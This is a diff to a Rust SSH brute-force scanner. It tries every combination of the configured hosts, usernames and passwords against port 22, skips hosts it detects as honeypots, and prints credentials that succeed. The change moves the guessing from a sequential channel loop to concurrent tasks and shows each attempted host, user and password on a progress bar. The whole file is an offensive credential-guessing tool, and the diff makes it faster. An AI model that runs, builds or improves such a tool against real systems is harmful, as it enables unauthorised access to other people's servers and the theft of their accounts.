@@ -6,13 +6,12 @@ extern crate tokio_stream;
 extern crate indicatif;
 use crate::args;
 use std::string::String;
-use tokio::sync::mpsc;
 use thrussh::*;
 use thrussh::client::*;
 use thrussh_keys::*;
 use std::sync::Arc;
 use indicatif::{ProgressBar, ProgressStyle};
-use core::task::Poll;
+use tokio::runtime::Runtime;
 
 struct Client {
 }
@@ -41,7 +40,7 @@ impl client::Handler for Client {
    }
 }
 
-async fn test_honeypot(host:&String) -> Result<bool, &'static str> {
+async fn test_honeypot(host:String) -> Result<bool, &'static str> {
     let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
     let client: Client = Client{};
     let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
@@ -59,10 +58,13 @@ async fn test_honeypot(host:&String) -> Result<bool, &'static str> {
     }
 }
 
-async fn try_login(host:&String, user:&String, pass:&String) -> Result<bool, &'static str> {
+async fn try_login(pb:ProgressBar, host:String, user:String, pass:String) -> Result<bool, &'static str> {
     let config: Arc<Config> = Arc::new(thrussh::client::Config::default());
     let client: Client = Client{};
     let session = thrussh::client::connect(config, format!("{}:22", host), client).await;
+    pb.inc(1);
+    let message = format!("{} {} {}", host, user, pass);
+    pb.set_message(&message);
     match session {
 	Ok(mut s) => {
 	    let auth = s.authenticate_password(user, pass).await;
@@ -74,6 +76,7 @@ async fn try_login(host:&String, user:&String, pass:&String) -> Result<bool, &'s
 			    return Err("Host is a honeypot");
 			},
 			Ok(false) => {
+			    pb.println(message);
 			    return Ok(true);
 			},
 			Err(e) => return Err(e),
@@ -89,44 +92,30 @@ async fn try_login(host:&String, user:&String, pass:&String) -> Result<bool, &'s
     }
 }
 
-pub async fn start(config:&args::Config) -> Result<bool, &'static str> {
-    // set up runner
+pub fn start(config:args::Config) -> Result<bool, &'static str> {
+
     let items: u64 = config.users.len() as u64 * config.passwords.len() as u64 * config.hosts.len() as u64;
-    let mut current: u64 = 0;
-    
+    let rt = Runtime::new().unwrap();
     let pb = ProgressBar::new(items);
     pb.set_style(ProgressStyle::default_bar()
 		 .template("{spinner:.green} {elapsed_precise} {msg} [{wide_bar}] [{pos}/{len}] ({eta}@{per_sec})")
 		 .progress_chars("=> "));
-    // XXX: make this tunable
-    let (tx, mut rx) = mpsc::channel(40);
 
-    let hosts = &config.hosts;
-    let users = &config.users;
-    let passwords = &config.passwords;
+    
+    let mut tasks: Vec<_> = Vec::new();
 
-    for host in hosts.iter() {
-	for user in users.iter() {
-	    for pass in passwords.iter() {
-		if let Err(_) = tx.send(vec!{host, user, pass}).await {
-		    return Err("SSH async receiver dropped");
-		}
+    for host in config.hosts.iter() {
+	for user in config.users.iter() {
+	    for pass in config.passwords.iter() {
+		let pb = pb.clone();
+		let host = host.clone();
+		let user = user.clone();
+		let pass = pass.clone();
+		tasks.push(try_login(pb, host, user, pass));
 	    }
         }
     }
-    while current < items {
-	if let Some(data) = rx.recv().await {
-	    pb.set_message(&format!("{}({}:{})", data[0], data[1], data[2]));
-	    let result = try_login(data[0], data[1], data[2]).await;
-	    match result {
-		Ok(true) => pb.println(format!("OK {} {} {}", data[0], data[1], data[2])),
-		Ok(false) => (),
-		Err(_e) => ()
-	    }
-	    pb.inc(1);
-	    current = current + 1;
-	}
-    }
+    rt.block_on(futures::future::join_all(tasks));
     pb.finish_with_message("scan complete");
     return Ok(true);
 }
